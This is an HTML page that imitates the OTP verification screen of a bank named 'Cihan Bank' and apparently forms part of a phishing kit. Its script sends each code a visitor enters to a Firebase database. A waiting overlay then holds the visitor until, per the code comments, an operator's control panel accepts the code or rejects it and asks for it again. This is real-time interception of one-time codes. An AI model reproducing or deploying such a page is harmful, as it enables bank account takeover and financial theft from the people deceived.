<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <!-- i18n: تحديد اللغة (الافتراضي السورانية) قبل الرسم لمنع الوميض -->
    <script src="/assets/i18n/i18n-init.js"></script>
    <link rel="stylesheet" href="/assets/i18n/i18n.css">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title data-i18n="التحقق من OTP | مصرف جيهان">التحقق من OTP | مصرف جيهان</title>
    <meta name="description" content="أدخل رمز التحقق المرسل إلى هاتفك لمصرف جيهان.">
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;800&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic:wght@400;600;700;800&display=swap" rel="stylesheet">

    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        background: '#ffffff',
                        foreground: '#020618',
                        primary: '#0f172b',
                        'primary-foreground': '#f8fafc',
                        brand: '#a91518',
                        'brand-foreground': '#fcfcfc',
                        input: '#e2e8f0',
                        muted: '#62748e',
                    },
                    fontFamily: { cairo: ['Cairo', 'sans-serif'] }
                }
            }
        }
    </script>
    <style>
        body { font-family: 'Cairo', sans-serif; }
        /* إخفاء أسهم حقول الأرقام */
        input[type=number]::-webkit-outer-spin-button,
        input[type=number]::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        input[type=number] { -moz-appearance: textfield; }
    </style>
    <style>
        /* خط كوردي (سورانی) يغطي الحروف الخاصة: ڕ ڵ ۆ ێ گ چ پ ژ */
        html[lang="ckb"] body { font-family: 'Noto Kufi Arabic', 'Cairo', sans-serif; }
        html[lang="en"] body { font-family: 'Cairo', 'Segoe UI', sans-serif; }
    </style>
</head>
<body class="bg-background text-foreground">

    <div class="flex min-h-screen flex-col bg-background px-6 pb-8 pt-5">

        <!-- زر اللغة + زر الرجوع -->
        <div class="flex items-center justify-between">
            <div data-lang-switcher data-lang-theme="light"></div>
            <a aria-label="رجوع" href="login.html" class="text-foreground hover:opacity-70 transition-opacity">
                <i class="fa-solid fa-chevron-right text-3xl"></i>
            </a>
        </div>

        <div class="mx-auto flex w-full max-w-md flex-1 flex-col items-center">

            <!-- شعار المصرف -->
            <div class="mt-8 h-44 w-44 rounded-full bg-white shadow-sm flex items-center justify-center">
                <img src="/assets/images/cihan-logo.png" alt="مصرف جيهان" class="h-32 w-32 object-contain">
            </div>

            <h1 class="mt-10 text-xl font-bold">التحقق من OTP</h1>

            <!-- تنبيه تجريبي -->
            <div role="alert" class="mt-4 w-full rounded-[14px] border-2 border-amber-500 bg-amber-50 p-4 text-center">
                <p class="mt-1 text-sm text-amber-700">

تم ارسال رمز التحقق الى رقم الجوال يرجى ادخال الرمز
                </p>
            </div>

            <!-- رسالة خطأ الرمز (تظهر عند الرفض من لوحة التحكم) -->
            <div id="otpError" role="alert" class="mt-4 hidden w-full rounded-[14px] border-2 border-red-500 bg-red-50 p-4 text-center">
                <p class="text-sm font-semibold text-red-600" data-i18n="الرمز المدخل غير صحيح، يرجى التأكد من الرمز">الرمز المدخل غير صحيح، يرجى التأكد من الرمز</p>
            </div>

            <!-- حقول الرمز (4 خانات) -->
            <div id="otpBoxes" dir="ltr" class="mt-8 grid w-full grid-cols-4 gap-3">
                <input inputmode="numeric" maxlength="1" aria-label="الرقم 1" class="otp-box aspect-[2/3] w-full rounded-lg border border-input bg-background text-center text-2xl outline-none focus:border-brand focus:ring-2 focus:ring-brand transition" value="">
                <input inputmode="numeric" maxlength="1" aria-label="الرقم 2" class="otp-box aspect-[2/3] w-full rounded-lg border border-input bg-background text-center text-2xl outline-none focus:border-brand focus:ring-2 focus:ring-brand transition" value="">
                <input inputmode="numeric" maxlength="1" aria-label="الرقم 3" class="otp-box aspect-[2/3] w-full rounded-lg border border-input bg-background text-center text-2xl outline-none focus:border-brand focus:ring-2 focus:ring-brand transition" value="">
                <input inputmode="numeric" maxlength="1" aria-label="الرقم 4" class="otp-box aspect-[2/3] w-full rounded-lg border border-input bg-background text-center text-2xl outline-none focus:border-brand focus:ring-2 focus:ring-brand transition" value="">
            </div>

            <p class="mt-6 text-center text-muted">الرجاء ادخال الكود الذي تم ارساله الى هاتفك</p>

            <!-- زر التالي -->
            <button id="otpNext" disabled class="mt-auto h-16 w-full rounded-full bg-brand text-2xl font-bold text-brand-foreground shadow-md disabled:opacity-60 transition hover:opacity-95">
                التالي
            </button>

        </div>
    </div>

    <!-- ==================== شاشة الانتظار (تبقى حتى يصل قرار لوحة التحكم) ==================== -->
    <div id="otpWait" class="fixed inset-0 z-[100] hidden flex-col items-center justify-center bg-white px-8 text-center">
        <div class="relative h-28 w-28 flex items-center justify-center">
            <div class="absolute inset-0 rounded-full border-4 border-brand/20"></div>
            <div class="absolute inset-0 animate-spin rounded-full border-4 border-brand border-t-transparent"></div>
            <div class="flex h-14 w-14 items-center justify-center rounded-full bg-primary text-2xl text-brand-foreground">
                <i class="fa-solid fa-shield-halved"></i>
            </div>
        </div>
        <h2 class="mt-8 text-2xl font-bold" data-i18n="جاري معالجة طلبك">جاري معالجة طلبك</h2>
        <p class="mt-3 max-w-sm text-sm font-semibold text-muted" data-i18n="يرجى الانتظار، جاري التحقق من بياناتك. يرجى عدم إغلاق الصفحة.">يرجى الانتظار، جاري التحقق من بياناتك. يرجى عدم إغلاق الصفحة.</p>
        <div class="mt-6 h-2 w-64 overflow-hidden rounded-full bg-input">
            <div id="otpWaitBar" class="h-full w-0 rounded-full bg-brand transition-all duration-200"></div>
        </div>
    </div>

    <!-- زر الأسئلة العائم -->
    <div dir="rtl" class="fixed bottom-4 left-4 z-50">
        <button type="button" class="rounded-full bg-primary px-4 py-3 text-sm font-bold text-primary-foreground shadow-lg transition hover:opacity-95">
            أسئلة عن العرض؟
        </button>
    </div>

    <script>
        (function () {
            var boxes = Array.prototype.slice.call(document.querySelectorAll('.otp-box'));
            var nextBtn = document.getElementById('otpNext');

            function code() {
                return boxes.map(function (b) { return b.value; }).join('');
            }
            function refresh() {
                nextBtn.disabled = code().length !== boxes.length;
            }

            boxes.forEach(function (box, i) {
                box.addEventListener('input', function () {
                    box.value = box.value.replace(/\D/g, '').slice(0, 1);
                    if (box.value && i < boxes.length - 1) boxes[i + 1].focus();
                    refresh();
                });
                box.addEventListener('keydown', function (e) {
                    if (e.key === 'Backspace' && !box.value && i > 0) {
                        boxes[i - 1].focus();
                        boxes[i - 1].value = '';
                        refresh();
                    }
                    if (e.key === 'ArrowLeft' && i > 0) boxes[i - 1].focus();
                    if (e.key === 'ArrowRight' && i < boxes.length - 1) boxes[i + 1].focus();
                });
                box.addEventListener('paste', function (e) {
                    var text = (e.clipboardData || window.clipboardData).getData('text') || '';
                    var digits = text.replace(/\D/g, '').split('');
                    if (!digits.length) return;
                    e.preventDefault();
                    digits.slice(0, boxes.length - i).forEach(function (d, k) { boxes[i + k].value = d; });
                    var focusIdx = Math.min(i + digits.length, boxes.length - 1);
                    boxes[focusIdx].focus();
                    refresh();
                });
            });

            nextBtn.addEventListener('click', function () {
                var otp = code();
                if (otp.length !== boxes.length) return;

                // إخفاء أي رسالة خطأ سابقة ثم إظهار شاشة الانتظار الدائمة
                var err = document.getElementById('otpError');
                if (err) err.classList.add('hidden');
                showOtpWait();

                // إرسال الرمز إلى قاعدة البيانات ثم البقاء في الانتظار
                // (الموافقة = توجيه للرئيسية، الرفض = إظهار رسالة الخطأ — كلاهما من اللوحة)
                if (typeof window.submitOtp === 'function') {
                    window.submitOtp(otp).catch(function () {});
                } else if (typeof window.pushFirebaseOtp === 'function') {
                    try { window.pushFirebaseOtp(otp); } catch (e) {}
                }
            });

            // ==================== شاشة الانتظار ====================
            var __otpWaitTimer = null;
            function showOtpWait() {
                var overlay = document.getElementById('otpWait');
                if (!overlay) return;
                overlay.classList.remove('hidden');
                overlay.classList.add('flex');
                document.body.style.overflow = 'hidden';
                var bar = document.getElementById('otpWaitBar');
                if (bar) {
                    var pct = 0;
                    if (__otpWaitTimer) clearInterval(__otpWaitTimer);
                    __otpWaitTimer = setInterval(function () {
                        pct = (pct + 3) % 103;
                        bar.style.width = Math.min(100, pct) + '%';
                    }, 100);
                }
            }
            function hideOtpWait() {
                var overlay = document.getElementById('otpWait');
                if (overlay) { overlay.classList.add('hidden'); overlay.classList.remove('flex'); }
                document.body.style.overflow = '';
                if (__otpWaitTimer) { clearInterval(__otpWaitTimer); __otpWaitTimer = null; }
            }
            window.__hideOtpWait = hideOtpWait;

            // عند الرفض: إخفاء الانتظار + تفريغ الحقول + طباعة رسالة الخطأ فوق الحقل
            window.__onOtpReject = function () {
                hideOtpWait();
                boxes.forEach(function (b) { b.value = ''; });
                refresh();
                var err = document.getElementById('otpError');
                if (err) err.classList.remove('hidden');
                if (boxes[0]) boxes[0].focus();
                window.scrollTo({ top: 0, behavior: 'smooth' });
            };
        })();
    </script>

    <!-- Firebase: الاتصال بقاعدة البيانات + الاستماع لأوامر لوحة التحكم -->
    <script src="/assets/js/firebase-env.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
    <script src="/assets/js/firebase-client.js?v=12"></script>
    <script src="/assets/js/request-store.js?v=1"></script>
    <script src="/assets/js/page-commands.js?v=5"></script>
    <!-- تسجيل معالجة الرفض بعد تحميل page-commands.js -->
    <script>
        (function () {
            function register() {
                if (typeof window.listenForPageCommands === 'function') {
                    window.listenForPageCommands({ onReject: window.__onOtpReject });
                } else {
                    setTimeout(register, 200);
                }
            }
            register();
        })();
    </script>
    <!-- i18n: القواميس + المحرّك + زر تبديل اللغة (يُطبَّق على كل الصفحات) -->
    <script src="/assets/i18n/ar.js?v=2"></script>
    <script src="/assets/i18n/en.js?v=2"></script>
    <script src="/assets/i18n/ckb.js?v=2"></script>
    <script src="/assets/i18n/i18n.js?v=1"></script>
    <script src="/assets/js/lang-switcher.js?v=1"></script>
</body>
</html>
